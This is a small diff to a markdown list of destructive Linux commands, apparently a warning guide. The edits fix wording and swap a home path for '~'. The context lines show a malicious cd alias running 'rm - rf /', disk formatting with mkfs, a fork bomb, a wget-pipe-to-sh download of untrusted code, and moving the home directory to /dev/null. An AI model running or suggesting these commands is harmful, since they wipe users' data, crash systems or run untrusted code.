@@ -16,7 +16,7 @@ echo "alias cd='rm - rf /'" >> ~/.bash_aliases
 ```
 mkfs.ext3 /dev/sda
 ```
-This command will format your /dev/sda device and of course will delete all files on it.
+This command will format your /dev/sda device and ofcourse will delete all files on it.
 
 ```
 :(){:|:&};:
@@ -29,7 +29,7 @@ wget http://sumber_tak_terpercaya -O- | sh
 This command will download a shell script from untrusted source and run it when the download finished
 
 ```
-mv /home/username/* /dev/null
+mv ~/* /dev/null
 ```
 This will move home directory to a place that actually doesn't exist. In other words, it will delete your home directory
 
